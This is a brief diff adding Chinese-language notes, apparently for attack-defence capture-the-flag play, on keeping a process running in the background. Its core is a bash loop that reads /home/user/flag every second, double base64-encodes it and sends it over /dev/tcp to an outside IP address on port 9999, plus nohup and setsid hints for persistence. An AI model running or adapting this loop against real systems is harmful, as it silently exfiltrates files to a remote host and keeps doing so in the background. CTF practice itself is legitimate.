@@ -1,0 +1,13 @@
+1、定时任务
+2、bash脚本：
+    #!/bin/bash
+    while true
+    do
+       sleep 1s
+       cat /home/user/flag  | base64  | base64 > /dev/tcp/172.5.70.157/9999  2>/dev/null
+    done
+ 3、python脚本
+ 
+ 4、后台运行
+   1、nohup xxxxx
+   2、setsid XXXX
